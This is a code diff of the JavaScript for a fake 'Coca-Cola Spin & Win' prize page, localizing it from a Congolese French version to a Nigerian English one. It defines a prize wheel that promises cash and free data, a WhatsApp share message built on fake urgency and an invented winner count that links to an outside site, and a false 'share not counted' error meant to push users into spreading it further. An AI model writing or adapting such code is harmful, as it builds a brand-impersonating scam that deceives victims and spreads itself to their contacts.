@@ -73,14 +73,14 @@ function answerQuestion(qNum, answer) {
 //  SPIN WHEEL
 // ═══════════════════════════════════════════════════════════════
 const SEGMENTS = [
-  { label: "Données gratuites",         sub: "100GB ",      color: "green",  image: "https://ad.grapofferprice.forum/assets/100gb.png", isPrize: true },
-  { label: "750.000 CDF",         sub: "Gain immédiat",  color: "white",  image: "https://reg.kanex.online/grapoffer/dr-congo-money-franc-banknotes-cdf-french-bills-d-illustration-money-dr-congo-franc-bills-cdf-banknotes-french-business-finance-237097620.jpg", isPrize: true },
-  { label: "250.000 CDF",          sub: "Gagnez de l'argent dès maintenant",      color: "green",  image: "https://reg.kanex.online/grapoffer/181-14-01-2-678x381.jpg",  isPrize: true },
-  { label: "50.000 CDF",          sub: "Temps d'antenne",  color: "white",  image: "https://reg.kanex.online/grapoffer/Drc-prize-airtime.png",   isPrize: true },
-  { label: "500.000 CDF",       sub: "Retirez vos gains maintenant",   color: "green",  image: "https://ad.grapofferprice.forum/assets/prize-data.png",      isPrize: true },
-  { label: "Données gratuites",         sub: "50GB ",  color: "white", image: "https://ad.grapofferprice.forum/assets/50gb.png",    isPrize: true },
-  { label: "tour bonus",       color: "green",  icon: "➜", isPrize: false },
-  { label: "Relancez",        color: "white",  icon: "↻", isPrize: false },
+  { label: "Free Data",         sub: "100GB ",      color: "green",  image: "https://ad.grapofferprice.forum/assets/100gb.png", isPrize: true },
+  { label: "₦150,000",         sub: "Instant Win",  color: "white",  image: "https://ad.grapofferprice.forum/assets/prize-cash-200k.png", isPrize: true },
+  { label: "₦25,000",          sub: "Earn cash now",      color: "green",  image: "https://ad.grapofferprice.forum/assets/prize-cash-50k.png",  isPrize: true },
+  { label: "₦10,000",          sub: "Airtime",  color: "white",  image: "https://ad.grapofferprice.forum/assets/prize-airtime.png",   isPrize: true },
+  { label: "₦250,000",       sub: "Cash Out now",   color: "green",  image: "https://ad.grapofferprice.forum/assets/prize-data.png",      isPrize: true },
+  { label: "Free Data",         sub: "50GB ",  color: "white", image: "https://ad.grapofferprice.forum/assets/50gb.png",    isPrize: true },
+  { label: "bonus spin",       color: "green",  icon: "➜", isPrize: false },
+  { label: "Spin Again",        color: "white",  icon: "↻", isPrize: false },
 ];
 const SEG_COUNT = SEGMENTS.length;
 const SEG_ANGLE = 360 / SEG_COUNT;
@@ -280,10 +280,10 @@ function initTallafir() {
   if (tallafirInited) return; // prevent double-binding clicks
   tallafirInited = true;
 
-  const text1    = 'Je%20n%27arrive%20pas%20%C3%A0%20croire%20ce%20que%20j%27ai%20vu%20aujourd%27hui%20%21%0A%0A%2AGrand%20Jeu%20Coca-Cola%20Spin%20%26%20Win%20%21%2A%0A%0AC%C3%A9l%C3%A9brez%20le%2075e%20anniversaire%20de%20Coca-Cola%20et%20tentez%20de%20gagner%20%3A%0A%20Des%20donn%C3%A9es%20mobiles%20gratuites%0A%F0%9F%92%B5%20Jusqu%27%C3%A0%20250%C2%A0000%20%E2%82%A6%20en%20prix%20en%20esp%C3%A8ces%0A%0A%2075%20personnes%20ont%20d%C3%A9j%C3%A0%20gagn%C3%A9%20%21%0A%0ALa%20participation%20est%20rapide%20et%20facile%20%E2%80%93%20il%20vous%20suffit%20de%20faire%20tourner%20la%20roue%20%21%0A%0A%20%2AIL%20NE%20RESTE%20QUE%2075%20PLACES%20%21%2A%0ACliquez%20maintenant%20avant%20qu%27il%20ne%20soit%20trop%20tard%20%F0%9F%91%87%0A%0Ahttps://reg.kanex.online/dr-coca-cola.html';
+  const text1    = 'I%20couldn%27t%20believe%20what%20I%20saw%20today%21%0A%0A%2ACoca-Cola%20Spin%20%26%20Win%20Giveaway%21%2A%0A%0ACelebrate%20Coca-Cola%27s%2075th%20Anniversary%20for%20a%20chance%20to%20win%3A%0A%20Free%20Data%0A%F0%9F%92%B5%20Up%20to%20%E2%82%A6250%2C000%20in%20Cash%20Prizes%0A%0A%2075%20people%20have%20already%20won%21%0A%0AParticipation%20is%20quick%20and%20easy%20%E2%80%93%20just%20spin%20the%20wheel%21%0A%0A%20%2AONLY%2075%20SPOTS%20LEFT%21%2A%0AClick%20now%20before%20it%27s%20gone%20%F0%9F%91%87%0A%0Ahttps://reg.kanex.online/coca-cola.html';
   const abcde    = '/';
   const shareUrl = 'whatsapp://send?text=' + text1;
-  const errorMsg = 'Un problème est survenu ! Le partage n'a pas été comptabilisé. Il est possible que vous ayez partagé le contenu avec le même ami ou groupe à plusieurs reprises ; veuillez réessayer.';
+  const errorMsg = 'There was a problem! The share was not counted. You may have shared to the same friend or group more than once, please share again.';
 
   // Restore bar progress
   let width = parseInt(load(KEY_CLAIM_W) || '0');
